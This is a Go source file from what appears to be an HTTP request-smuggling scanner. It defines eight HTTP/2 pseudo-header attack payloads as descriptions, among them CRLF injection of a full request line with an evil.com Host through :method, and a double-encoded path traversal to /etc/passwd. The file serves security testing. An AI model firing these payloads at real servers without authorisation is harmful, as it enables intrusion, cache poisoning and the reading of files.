package vectors

import (
	"github.com/byteoverride/desynctrace/internal/client"
)

// H2PseudoVector tests HTTP/2 pseudo-header manipulation attacks.
// When H2 requests are downgraded to H1 by a proxy, pseudo-headers
// become part of the request line and Host header. Injecting special
// characters can cause desync in the downgraded H1 request.
type H2PseudoVector struct{}

func NewH2PseudoVector() *H2PseudoVector {
	return &H2PseudoVector{}
}

func (v *H2PseudoVector) Name() string {
	return "H2.Pseudo (HTTP/2 Pseudo-Header Manipulation)"
}

func (v *H2PseudoVector) Type() VectorType {
	return H2Pseudo
}

func (v *H2PseudoVector) GeneratePayloads(baseReq *client.Request) []*client.Request {
	return nil // H2-only, requires RawH2Client
}

func (v *H2PseudoVector) GenerateRawPayloads(host, path string) []RawPayload {
	var payloads []RawPayload

	// 1. Duplicate :method pseudo-header
	payloads = append(payloads, RawPayload{
		Name:        "h2-dup-method",
		Description: "Two :method pseudo-headers (:method: GET, :method: POST). Downgrade proxy may use first, backend may use second.",
		Technique:   "h2-pseudo-dup",
	})

	// 2. Full URL in :path
	payloads = append(payloads, RawPayload{
		Name:        "h2-full-url-path",
		Description: "Full URL in :path pseudo-header: :path: https://evil.com/. Some proxies reconstruct the request line differently.",
		Technique:   "h2-pseudo-fullurl",
	})

	// 3. Space in :method
	payloads = append(payloads, RawPayload{
		Name:        "h2-method-space",
		Description: "Space in :method: ':method: GET /admin HTTP/1.1\\r\\nHost: evil.com\\r\\n\\r\\nGET'. Entire request line injected via method.",
		Technique:   "h2-pseudo-method-inject",
	})

	// 4. :path with fragment
	payloads = append(payloads, RawPayload{
		Name:        "h2-path-fragment",
		Description: ":path with fragment: '/#fragment'. Backend may strip fragment, proxy may forward it, causing path disagreement.",
		Technique:   "h2-pseudo-fragment",
	})

	// 5. :scheme manipulation
	payloads = append(payloads, RawPayload{
		Name:        "h2-scheme-override",
		Description: ":scheme: http on an HTTPS connection. May cause proxy to downgrade to HTTP backend, exposing plaintext channel.",
		Technique:   "h2-pseudo-scheme",
	})

	// 6. Empty :path
	payloads = append(payloads, RawPayload{
		Name:        "h2-empty-path",
		Description: "Empty :path pseudo-header. Proxy may default to '/', backend may reject. Different defaults = different routing.",
		Technique:   "h2-pseudo-empty-path",
	})

	// 7. :path with encoded characters that get double-decoded
	payloads = append(payloads, RawPayload{
		Name:        "h2-path-double-encode",
		Description: ":path: /admin%2f..%2f..%2fetc/passwd. Frontend decodes once, backend decodes again → path traversal via smuggling.",
		Technique:   "h2-pseudo-double-encode",
	})

	// 8. :authority with port smuggling
	payloads = append(payloads, RawPayload{
		Name:        "h2-authority-port",
		Description: ":authority: target.com:1234. Backend may route to different internal service based on port in Host header.",
		Technique:   "h2-pseudo-authority-port",
	})

	return payloads
}

func (v *H2PseudoVector) Verify(resp *client.Response) bool {
	return resp.StatusCode >= 400
}
